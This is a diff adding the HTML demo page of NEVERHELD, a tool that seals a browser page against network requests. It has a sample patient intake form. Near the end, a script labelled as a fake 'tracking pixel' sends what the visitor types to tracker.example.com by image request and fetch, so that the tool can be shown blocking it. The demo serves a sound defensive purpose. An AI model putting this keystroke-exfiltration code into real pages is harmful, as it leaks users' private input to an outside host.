@@ -1,0 +1,53 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>NEVERHELD demo: sealed in the browser, proof you can check</title>
+<style>
+body{font:16px/1.6 system-ui,-apple-system,Segoe UI,Roboto,sans-serif;max-width:760px;margin:40px auto;padding:0 20px;color:#17202c}
+h1{font-size:30px;margin-bottom:4px}.tag{color:#4e6b62;margin-top:0}
+.card{border:1px solid #d5dde5;border-radius:12px;padding:20px;margin:20px 0}
+label{display:block;font-weight:600;margin-top:12px}input,textarea{width:100%;box-sizing:border-box;padding:8px;font:inherit;border:1px solid #b8c2cc;border-radius:6px}
+ol li{margin:4px 0}.small{font-size:14px;color:#596574}.warn{background:#fff7e6;border-color:#f0d9a8}
+a{color:#0b5e4a}
+</style>
+</head>
+<body>
+<h1>NEVERHELD</h1>
+<p class="tag">Sealed in the browser. Proof you can check.</p>
+
+<div class="card">
+<strong>Try it in 2 minutes</strong>
+<ol>
+<li>Wait for the dialog to close. The page is now sealed (top right: <em>NOPE: 0</em>).</li>
+<li>Type in the form below. This page also carries a fake "tracking pixel" that tries to send everything you type to another site.</li>
+<li>Watch <em>Blocked</em> go up: the browser refused each attempt. NOPE stays at 0.</li>
+<li>Press <em>Proof and checks</em>, then <em>Download JSON proof</em>.</li>
+<li>Open the <a href="/verify.html" target="_blank" rel="noopener">offline verifier</a> and choose the proof file. Change one character in the file and check it again: it fails.</li>
+</ol>
+</div>
+
+<div class="card">
+<strong>Sample patient intake (demo: nothing is stored or sent)</strong>
+<label for="name">Name</label><input id="name" autocomplete="off">
+<label for="symptoms">Symptoms</label><textarea id="symptoms" rows="3"></textarea>
+<label for="file">Attach a document (fingerprinted in your browser, never uploaded)</label><input id="file" type="file">
+</div>
+
+<div class="card warn small">
+<strong>What this does and does not show.</strong> After sealing, the browser's Content Security Policy refuses this page's fetch, beacon, WebSocket, form and resource requests, and NEVERHELD blocks WebRTC and network hints inside the page. Known limits: WebRTC through an iframe's own copy, a Safari preconnect, browser extensions, other tabs, and whole-tab navigation. The proof is written by the page itself; it is evidence, not a signed record of the session or an independent audit. <a href="https://github.com/jakinmade/Neverheld" rel="noopener">Read the full limits</a>.
+</div>
+
+<p class="small">Evaluation build 0.3.2 (unsigned): <a href="/download/neverheld-0.3.2.tar.gz">download the package</a> · <a href="/download/neverheld-0.3.2.tar.gz.sha256">SHA-256</a>. Licence: all rights reserved; evaluation by written agreement. Contact: <a href="mailto:john@akinmade.co.uk">john@akinmade.co.uk</a></p>
+
+<script>
+// The fake "tracking pixel": a typical third-party tag that sends what the visitor types.
+document.addEventListener("input", function (event) {
+  var value = encodeURIComponent((event.target && event.target.value || "").slice(-40));
+  new Image().src = "https://tracker.example.com/pixel.gif?q=" + value;
+  try { fetch("https://tracker.example.com/collect", { method: "POST", body: value }).catch(function () {}); } catch (e) {}
+});
+</script>
+<script src="/neverheld.min.js" data-auto-seal data-application="NEVERHELD public demo" data-version="0.3.2" data-workers-network="none"></script>
+</body>
+</html>
